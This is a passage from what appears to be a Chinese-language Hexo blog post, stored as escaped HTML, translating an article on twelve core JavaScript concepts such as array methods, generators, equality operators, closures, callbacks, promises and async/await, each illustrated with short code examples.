变长参数（rest）语法\"></a>5. 变长参数（rest）语法</h2><p>你可以用它将传给函数的任意数量的参数放入数组中！<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myFunc</span>(<span class=\"params\">...args</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(args[<span class=\"number\">0</span>] + args[<span class=\"number\">1</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">myFunc(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\"><span class=\"comment\">// 3</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"6-数组方法\"><a href=\"#6-数组方法\" class=\"headerlink\" title=\"6. 数组方法\"></a>6. 数组方法</h2><p>JavaScript 数组方法通常可以为你提供令人难以置信的优雅方式来执行所需的数据转换。作为 StackOverflow 的贡献者，我经常看到有关如何以这种或那种方式操纵对象数组的问题。这往往是数组方法的完美用例。</p>\n<h3 id=\"map、filter、reduce\"><a href=\"#map、filter、reduce\" class=\"headerlink\" title=\"map、filter、reduce\"></a>map、filter、reduce</h3><p>map：返回一个数组，其中每个元素都使用指定函数进行过转换。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> mapped = arr.map(<span class=\"function\"><span class=\"params\">el</span> =&gt;</span> el + <span class=\"number\">20</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(mapped);</span><br><span class=\"line\"><span class=\"comment\">// [21, 22, 23, 24, 25, 26]</span></span><br></pre></td></tr></table></figure></p>\n<p>filter：返回一个数组，只有当指定函数返回 true 时，相应的元素才会被包含在这个数组中。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> filtered = arr.filter(<span class=\"function\"><span class=\"params\">el</span> =&gt;</span> el === <span class=\"number\">2</span> || el === <span class=\"number\">4</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(filtered);</span><br><span class=\"line\"><span class=\"comment\">// [2, 4]</span></span><br></pre></td></tr></table></figure></p>\n<p>reduce：基于给定函数累加值。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> reduced = arr.reduce(<span class=\"function\">(<span class=\"params\">total, current</span>) =&gt;</span> total + current);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(reduced);</span><br><span class=\"line\"><span class=\"comment\">// 21</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"find、findIndex、indexOf\"><a href=\"#find、findIndex、indexOf\" class=\"headerlink\" title=\"find、findIndex、indexOf\"></a>find、findIndex、indexOf</h3><p>find：返回与指定条件匹配的第一个实例，不会继续查找其他匹配的实例。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> found = arr.find(<span class=\"function\"><span class=\"params\">el</span> =&gt;</span> el &gt; <span class=\"number\">5</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(found);</span><br><span class=\"line\"><span class=\"comment\">// 6</span></span><br></pre></td></tr></table></figure></p>\n<p>虽然 5 之后的元素都符合条件，但只返回第一个匹配的元素。</p>\n<p>findIndex：这与 find 几乎完全相同，但不返回第一个匹配的元素，而是返回第一个匹配元素的索引。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"string\">'Nick'</span>, <span class=\"string\">'Frank'</span>, <span class=\"string\">'Joe'</span>, <span class=\"string\">'Frank'</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> foundIndex = arr.findIndex(<span class=\"function\"><span class=\"params\">el</span> =&gt;</span> el === <span class=\"string\">'Frank'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(foundIndex);</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure></p>\n<p>indexOf：与 findIndex 几乎完全相同，但它的参数不是一个函数，而是一个简单的值。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"string\">'Nick'</span>, <span class=\"string\">'Frank'</span>, <span class=\"string\">'Joe'</span>, <span class=\"string\">'Frank'</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> foundIndex = arr.indexOf(<span class=\"string\">'Frank'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(foundIndex);</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"push、pop、shift、unshift\"><a href=\"#push、pop、shift、unshift\" class=\"headerlink\" title=\"push、pop、shift、unshift\"></a>push、pop、shift、unshift</h3><p>push：这是一个相对简单的方法，它将一个项添加到数组的末尾。它就地修改数组，函数本身会返回添加到数组中的项。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> pushed = arr.push(<span class=\"number\">5</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3, 4, 5]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(pushed);</span><br><span class=\"line\"><span class=\"comment\">// 5</span></span><br></pre></td></tr></table></figure></p>\n<p>pop：从数组中删除最后一项。同样，它也是就地修改数组。函数本身返回从数组中删除的项。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> popped = arr.pop();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(popped);</span><br><span class=\"line\"><span class=\"comment\">// 4</span></span><br></pre></td></tr></table></figure></p>\n<p>shift：从数组中删除第一个项。同样，它也是就地修改数组。函数本身返回从数组中删除的项。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> shifted = arr.shift();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// [2, 3, 4]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(shifted);</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br></pre></td></tr></table></figure></p>\n<p>unshift：将一个或多个元素添加到数组的开头。同样，它也是就地修改数组。与其他方法不同的是，函数本身返回数组最新的长度。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> unshifted = arr.unshift(<span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// [5, 6, 7, 1, 2, 3, 4]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(unshifted);</span><br><span class=\"line\"><span class=\"comment\">// 7</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"splice、slice\"><a href=\"#splice、slice\" class=\"headerlink\" title=\"splice、slice\"></a>splice、slice</h3><p>splice：通过删除或替换现有元素或者添加新元素来修改数组的内容。这个方法也是就地修改数组。</p>\n<p>下面的代码示例的意思是：在数组的位置 1 上删除 0 个元素，并插入 b。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"string\">'a'</span>, <span class=\"string\">'c'</span>, <span class=\"string\">'d'</span>, <span class=\"string\">'e'</span>];</span><br><span class=\"line\">arr.splice(<span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"string\">'b'</span>)</span><br></pre></td></tr></table></figure></p>\n<p>slice：从指定的起始位置和结束位置之前返回数组的浅拷贝。如果未指定结束位置，则返回数组的其余部分。这个方法不会修改数组，只是返回所需的子集。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"string\">'a'</span>, <span class=\"string\">'b'</span>, <span class=\"string\">'c'</span>, <span class=\"string\">'d'</span>, <span class=\"string\">'e'</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> sliced = arr.slice(<span class=\"number\">2</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(sliced);</span><br><span class=\"line\"><span class=\"comment\">// ['c', 'd']</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// ['a', 'b', 'c', 'd', 'e']</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"sort\"><a href=\"#sort\" class=\"headerlink\" title=\"sort\"></a>sort</h3><p>sort：根据提供的函数对数组进行排序。这个方法就地修改数组。如果函数返回负数或 0，则顺序保持不变。如果返回正数，则交换元素顺序。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">3</span>, <span class=\"number\">-1</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> sorter = <span class=\"function\">(<span class=\"params\">firstEl, secondEl</span>) =&gt;</span> firstEl - secondEl;</span><br><span class=\"line\">arr.sort(sorter);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\"><span class=\"comment\">// [-1, 1, 2, 3, 5, 7, 7]</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"7-生成器\"><a href=\"#7-生成器\" class=\"headerlink\" title=\"7. 生成器\"></a>7. 生成器</h2><p>看到 * 不要害怕。生成器函数指定下一次调用 next() 时会生成什么 value。既可以生成有限数量的 value（最后调用 next() 会返回 undefined），也可以使用循环生成无限数量的 value。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">greeter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> <span class=\"string\">'Hi'</span>;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> <span class=\"string\">'How are you?'</span>;</span><br><span class=\"line\">  <span class=\"keyword\">yield</span> <span class=\"string\">'Bye'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> greet = greeter();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(greet.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 'Hi'</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(greet.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 'How are you?'</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(greet.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 'Bye'</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(greet.next().value);</span><br><span class=\"line\"><span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure></p>\n<p>使用生成器生成无限个值：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span>* <span class=\"title\">idCreator</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</span><br><span class=\"line\">    <span class=\"keyword\">yield</span> i++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> ids = idCreator();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ids.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ids.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ids.next().value);</span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br><span class=\"line\"><span class=\"comment\">// etc...</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"8-与\"><a href=\"#8-与\" class=\"headerlink\" title=\"8. === 与 ==\"></a>8. === 与 ==</h2><p>一定要知道 JavaScript 中 === 运算符和 == 运算符之间的区别！== 运算符在比较之前会进行类型转换，而 === 运算符在比较之前不会进行类型转换。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"number\">0</span> == <span class=\"string\">'0'</span>);</span><br><span class=\"line\"><span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"number\">0</span> === <span class=\"string\">'0'</span>);</span><br><span class=\"line\"><span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"9-对象比较\"><a href=\"#9-对象比较\" class=\"headerlink\" title=\"9. 对象比较\"></a>9. 对象比较</h2><p>JavaScript 新手容易犯的一个错误是直接比较对象。变量一般是指向内存中对象的引用，而不是对象本身！比较对象的一种方法是将它们转换成 JSON 字符串。但这样做有一个缺点：无法保证对象属性的顺序！一种更安全的方法是使用专门进行深度对象比较的库（例如 lodash 的 isEqual，<a href=\"https://lodash.com/docs#isEqual）。\" target=\"_blank\" rel=\"noopener\">https://lodash.com/docs#isEqual）。</a></p>\n<p>下面的对象看起来相同，但它们实际上指向不同的引用。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> joe1 = &#123; <span class=\"attr\">name</span>: <span class=\"string\">'Joe'</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">const</span> joe2 = &#123; <span class=\"attr\">name</span>: <span class=\"string\">'Joe'</span> &#125;;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(joe1 === joe2);</span><br><span class=\"line\"><span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure></p>\n<p>相反，下面的结果为 true，因为使用其中一个对象为另一个对象赋值，它们都指向相同的引用（内存中只有一个对象）。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> joe1 = &#123; <span class=\"attr\">name</span>: <span class=\"string\">'Joe'</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">const</span> joe2 = joe1;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(joe1 === joe2);</span><br><span class=\"line\"><span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"10-回调函数\"><a href=\"#10-回调函数\" class=\"headerlink\" title=\"10. 回调函数\"></a>10. 回调函数</h2><p>很多人都被 JavaScript 回调函数吓倒了！它们其实很简单，请看下面的例子。console.log 函数作为回调传给 myFunc，并在 setTimeout 完成时执行。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myFunc</span>(<span class=\"params\">text, callback</span>) </span>&#123;</span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    callback(text);</span><br><span class=\"line\">  &#125;, <span class=\"number\">2000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">myFunc(<span class=\"string\">'Hello world!'</span>, <span class=\"built_in\">console</span>.log);</span><br><span class=\"line\"><span class=\"comment\">// 'Hello world!'</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"11-promise\"><a href=\"#11-promise\" class=\"headerlink\" title=\"11. promise\"></a>11. promise</h2><p>一旦你理解了 JavaScript 回调，很快就会发现自己陷入了“回调地狱”中。这个时候可以使用 promise！将异步逻辑包装在 promise 中，使用“then”来处理成功的情况，使用“catch”来处理异常。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> myPromise = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">res, rej</span>) </span>&#123;</span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">Math</span>.random() &lt; <span class=\"number\">0.9</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> res(<span class=\"string\">'Hooray!'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> rej(<span class=\"string\">'Oh no!'</span>);</span><br><span class=\"line\">  &#125;, <span class=\"number\">1000</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">myPromise</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'Success: '</span> + data);</span><br><span class=\"line\">   &#125;)</span><br><span class=\"line\">   .catch(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">err</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'Error: '</span> + err);</span><br><span class=\"line\">   &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// If Math.random() returns less than 0.9 the following is logged:</span></span><br><span class=\"line\"><span class=\"comment\">// \"Success: Hooray!\"</span></span><br><span class=\"line\"><span class=\"comment\">// If Math.random() returns 0.9 or greater the following is logged:</span></span><br><span class=\"line\"><span class=\"comment\">// \"Error: On no!\"</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"12-Async-Await\"><a href=\"#12-Async-Await\" class=\"headerlink\" title=\"12. Async/Await\"></a>12. Async/Await</h2><p>在掌握了 promise 的用法后，你可能也会喜欢 async await，它只是一种基于 promise 的“语法糖”。在下面的示例中，我们创建了一个 async 函数，并 await greeter promise。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> greeter = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">res, rej</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> res(<span class=\"string\">'Hello world!'</span>), <span class=\"number\">2000</span>);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myFunc</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> greeting = <span class=\"keyword\">await</span> greeter;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(greeting);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">myFunc();</span><br><span class=\"line\"><span class=\"comment\">// 'Hello world!'</span></span><br></pre></td></tr></table></figure></p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p><a href=\"https://mp.weixin.qq.com/s/lv55kP8MUboteMkV9basoQ\" target=\"_blank\" rel=\"noopener\">原文地址</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>JavaScript 是一门复杂的语言。如果你是一名 JavaScript 开发人员，不管处于什么样的水平，都有必要了解 JavaScript 的基本概念。本文介绍了 12 个非常重要的 JavaScript 概念，但绝对不是说 JavaScript 开发人员只需要知道这些就可以了。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"1-变量赋值（值与引用）\"><a href=\"#1-变量赋值（值与引用）\" class=\"headerlink\" title=\"1. 变量赋值（值与引用）\"></a>1. 变量赋值（值与引用）</h2><p>JavaScript 总是按照值来给变量赋值。当指定的值是 JavaScript 的五种原始类型之一（即 Boolean、null、undefined、String 和 Number）时，将为变量分配实际的值。但是，当指定的值是 Array、Function 或 Object 时，将为变量分配内存的对象引用。</p>\n<p>在下面的代码段中，使用 var1 对 var2 赋值。由于 var1 是基本类型（String），因此 var2 的值等于 var1 的 String 值，但这个时候可以认为 var2 与 var1 完全不同。因此，重新为 var2 赋值对 var1 没有任何影响。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> var1 = <span class=\"string\">'My string'</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> var2 = var1;</span><br><span class=\"line\">var2 = <span class=\"string\">'My new string'</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(var1);</span><br><span class=\"line\"><span class=\"comment\">// 'My string'</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(var2);</span><br><span class=\"line\"><span class=\"comment\">// 'My new string'</span></span><br></pre></td></tr></table></figure>\n<p>我们将它与对象赋值进行比较。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> var1 = &#123; <span class=\"attr\">name</span>: <span class=\"string\">'Jim'</span> &#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> var2 = var1;</span><br><span class=\"line\">var2.name = <span class=\"string\">'John'</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(var1);</span><br><span class=\"line\"><span class=\"comment\">// &#123; name: 'John' &#125;</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(var2);</span><br><span class=\"line\"><span class=\"comment\">// &#123; name: 'John' &#125;</span></span><br></pre></td></tr></table></figure>\n<p>如果你期望它会像原始类型赋值那样，很可能会出问题！如果你创建了一个无意中会改变对象的函数，就会出现一些非预期的行为。</p>\n<h2 id=\"2-闭包\"><a href=\"#2-闭包\" class=\"headerlink\" title=\"2. 闭包\"></a>2. 闭包</h2><p>闭包是一种重要的 JavaScript 模式，可用于访问私有变量。在下面的示例中，createGreeter 返回一个匿名函数，这个函数可以访问参数 greeting（在这里是“Hello”）。在后续的调用中，sayHello 将有权访问这个 greeting！<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createGreeter</span>(<span class=\"params\">greeting</span>) </span>&#123;</span><br><span 